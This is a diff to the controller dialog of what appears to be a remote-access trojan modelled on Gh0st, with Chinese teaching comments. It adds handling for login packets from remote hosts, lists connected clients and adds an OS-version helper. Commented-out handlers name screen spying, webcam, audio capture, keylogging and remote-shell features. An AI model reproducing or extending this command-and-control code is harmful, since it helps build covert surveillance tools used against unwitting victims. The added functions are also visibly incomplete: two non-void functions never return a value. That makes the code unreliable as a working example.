@@ -7,10 +7,13 @@
 #include "PCRemoteDlg.h"
 #include "afxdialogex.h"
 #include "SettingDlg.h"
+#include "..\common\macros.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
+
+typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
 
 typedef struct
 {
@@ -120,6 +123,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 
 	//自定义消息
 	ON_MESSAGE(UM_ICONNOTIFY, OnIconNotify)  
+	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
@@ -151,6 +155,108 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, 
 		}
 	}catch(...){}
 }
+
+void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
+{
+	if (pContext == NULL)
+		return;
+
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
+
+	// 交给窗口处理
+	/*if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
+	{
+		switch (pContext->m_Dialog[0])
+		{
+		case FILEMANAGER_DLG:
+			((CFileManagerDlg *)dlg)->OnReceiveComplete();
+			break;
+		case SCREENSPY_DLG:
+			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			break;
+		case WEBCAM_DLG:
+			((CWebCamDlg *)dlg)->OnReceiveComplete();
+			break;
+		case AUDIO_DLG:
+			((CAudioDlg *)dlg)->OnReceiveComplete();
+			break;
+		case KEYBOARD_DLG:
+			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+			break;
+		case SYSTEM_DLG:
+			((CSystemDlg *)dlg)->OnReceiveComplete();
+			break;
+		case SHELL_DLG:
+			((CShellDlg *)dlg)->OnReceiveComplete();
+			break;
+		default:
+			break;
+		}
+		return;
+	}*/
+
+	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
+	{                                                           //讲解后回到ClientContext结构体
+	/*case TOKEN_AUTH: // 要求验证
+		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
+		break;
+	case TOKEN_HEARTBEAT: // 回复心跳包
+		{
+			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+
+		break;*/
+	case TOKEN_LOGIN: // 上线包
+
+		{
+			//这里处理上线
+			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
+			{
+				closesocket(pContext->m_Socket);
+			}
+			else
+			{
+				pContext->m_bIsMainSocket = true;
+				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);   
+			}
+			// 激活
+			BYTE	bToken = COMMAND_ACTIVED;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+
+		break;
+	/*case TOKEN_DRIVE_LIST: // 驱动器列表
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_BITMAPINFO: //
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_AUDIO_START: // 语音
+		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_KEYBOARD_START:
+		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_PSLIST:
+		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_SHELL_START:
+		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;*/
+		// 命令停止当前操作
+	default:
+		closesocket(pContext->m_Socket);
+		break;
+	}
+}
+
 
 void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
 {
@@ -709,4 +815,76 @@ void CPCRemoteDlg::OnClose()
 	CDialogEx::OnClose();
 }
 
+CString CPCRemoteDlg::GetOSDisplayString(OSVERSIONINFOEX& osvi)
+{
+	CString strOS;
+	SYSTEM_INFO si;
+	PGNSI pGNSI;
 
+	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
+	if(NULL != pGNSI)
+		pGNSI(&si);
+	else GetSystemInfo(&si);
+
+	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId &&
+		osvi.dwMajorVersion > 4)
+	{
+		if (osvi.dwMajorVersion == 6)
+		{
+			if(osvi.dwMinorVersion == 0)
+				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows Vista" : "Windows Server 2008";
+
+			if(osvi.dwMinorVersion == 1)
+				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows 7" : "Windows Server 2008 R2";
+
+			if(osvi.dwMinorVersion == 2)
+				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows 8" : "Windows Server 2012";
+		}
+
+		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
+		{
+			if(GetSystemMetrics(SM_SERVERR2))
+				strOS = "Windows Server 2003 R2";
+			else if(osvi.wSuiteMask & VER_SUITE_STORAGE_SERVER)
+				strOS = "Windows Storage Server 2003";
+			else if(osvi.wSuiteMask & VER_SUITE_WH_SERVER)
+				strOS = "Windows Home Server";
+			else if(osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
+				strOS = "Windows XP Professional x64 Edition";
+			else 
+				strOS = "Windows Server 2003";
+		}
+
+		if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
+			strOS = "Windows XP";
+
+		if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
+			strOS = "Windows 2000";
+	}
+}
+
+LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam,LPARAM lParam)
+{
+	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
+	ClientContext *pContext = (ClientContext*)lParam;
+
+	if(!pContext)
+		return -1;
+
+	try
+	{
+		if(pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
+			return -1;
+
+		LOGININFO *pLoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
+
+		sockaddr_in sockAddr;
+		ZeroMemory(&sockAddr, sizeof(sockaddr_in));
+		int nSockAddrLen = sizeof(sockAddr);
+
+		int nRet = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
+		strIP = (nRet != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";
+		strPCName = pLoginInfo->HostName;
+	}
+	catch (...){}
+}
